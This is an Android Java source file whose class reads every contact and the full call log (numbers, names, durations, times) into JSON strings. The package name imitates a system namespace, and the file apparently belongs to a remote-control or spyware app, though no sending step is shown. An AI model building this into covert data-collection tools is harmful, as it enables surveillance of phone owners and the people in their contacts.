package com.android.controller.functionalities;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;

public class ContactAndCallLogUtil {
    Context context;

    public ContactAndCallLogUtil(Context context) {
        this.context = context;
    }

    public String getAllContacts() {
        JSONObject result = new JSONObject();
        JSONArray contactsArray = new JSONArray();

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
        );

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                @SuppressLint("Range") String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                JSONObject contactObject = new JSONObject();
                try {
                    contactObject.put("Name", name);
                    contactObject.put("PhoneNumber", phoneNumber);
                    contactsArray.put(contactObject);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }

        try {
            result.put("Contacts", contactsArray);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return result.toString();
    }

    public String getAllCallLogs() throws JSONException {
        JSONObject result = new JSONObject();
        try {
            JSONArray callLogsArray = new JSONArray();

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    @SuppressLint("Range") String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    @SuppressLint("Range") String time = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));

                    // Retrieve contact name from phone number
                    String contactName = getContactNameFromNumber(number);

                    JSONObject callLogObject = new JSONObject();
                    try {
                        long durationInSeconds = Long.parseLong(duration);
                        long minutes = durationInSeconds / 60;
                        long seconds = durationInSeconds % 60;
                        String durationFormatted = String.format("%d.%02d", minutes, seconds);

                        // Convert time to human-readable format
                        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy/HH/mm/ss");
                        Date date = new Date(Long.parseLong(time));
                        String timeFormatted = sdf.format(date);

                        callLogObject.put("Number", number);
                        callLogObject.put("ContactName", contactName);
                        callLogObject.put("Duration", durationFormatted);
                        callLogObject.put("Time", timeFormatted);

                        callLogsArray.put(callLogObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                        result.put("Error", e.toString());
                    }
                }
                cursor.close();
            }

            try {
                result.put("CallLogs", callLogsArray);
            } catch (JSONException e) {
                e.printStackTrace();
                result.put("Error", e.toString());
            }

            return result.toString();
        } catch (Exception e) {
            return (result.put("Error", e.toString())).toString();
        }
    }

    // Helper method to get contact name from phone number
    @SuppressLint("Range")
    private String getContactNameFromNumber(String phoneNumber) {
        String contactName = "Unknown";
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }
            cursor.close();
        }

        return contactName;
    }


}
